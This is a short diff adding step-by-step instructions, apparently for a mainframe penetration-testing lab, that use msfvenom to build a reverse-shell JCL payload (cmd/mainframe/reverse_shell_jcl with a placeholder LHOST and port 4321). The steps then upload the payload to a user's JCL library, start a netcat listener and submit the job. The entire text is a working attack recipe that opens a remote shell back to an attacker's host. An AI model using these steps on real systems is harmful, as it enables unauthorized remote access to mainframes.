@@ -1,0 +1,9 @@
+Part 1 - Create HLASM JCL with metasploit
+- Run the command 'msfvenom -p cmd/mainframe/reverse_shell_jcl LHOST='<your ip>' LPORT=4321 > hlasmuss
+- Upload the file to <userid>.JCLLIB(HLASMUSS)
+- Edit HLASMUSS and change 'DUMMY' to your userid
+
+Part 2 - Connect
+- Launch netcat listener
+- submit jcl
+
